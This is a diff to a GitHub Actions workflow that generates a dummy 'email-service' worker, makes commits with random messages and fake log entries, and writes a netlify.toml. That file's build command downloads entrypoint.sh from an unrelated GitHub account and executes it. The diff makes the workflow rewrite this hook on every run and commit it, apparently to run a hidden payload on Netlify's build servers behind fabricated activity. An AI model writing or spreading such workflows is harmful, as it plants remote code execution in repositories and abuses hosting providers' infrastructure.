@@ -34,17 +34,18 @@ jobs:
             echo "[Token](https://github.com/settings/tokens)" >> README.md
             printf "name = 'email-service'\nmain = 'worker.js'\ncompatibility_date = '%s'\nworkers_dev = true\n"  "$(date +%F)" > wrangler.toml
             echo 'export default{async fetch(){return new Response("email-service",{headers:{"content-type":"text/plain"}})}}' > worker.js
-            echo '#netlify.toml \n[context.production]\n  publish = "/output"\n  command = "curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh 02_$NUMBER_P"' > netlify.toml
+            echo '[context.production]\n  publish = "/output"\n  command = "curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh 02_$NUMBER_P"' > netlify.toml
             git add data-commit.txt README.md worker.js wrangler.toml netlify.toml
             RANDOM_LINE="$(shuf -n 1 data-commit.txt | tr -d '\r')"
             git commit -m "$RANDOM_LINE"
             git push
           fi
+          echo '[context.production]\n  publish = "/output"\n  command = "curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh 02_$NUMBER_P"' > netlify.toml
           echo "$(date '+%T') | phase=$(shuf -i100000-999999 -n1)" >> "$FILE"
           echo "$(date '+%T') | commit_sha=$(shuf -i1000-9999 -n1)" >> "$FILE"
           NASHJ="$(sha256sum "$FILE" | awk '{print $1}')"
           echo "$(date '+%T') | fingerprint=$NASHJ" >> "$FILE"
-          git add "$FILE"
+          git add "$FILE" netlify.toml
           RANDOM_LINE="$(shuf -n 1 data-commit.txt | tr -d '\r')"
           git commit -m "$RANDOM_LINE"
           git push
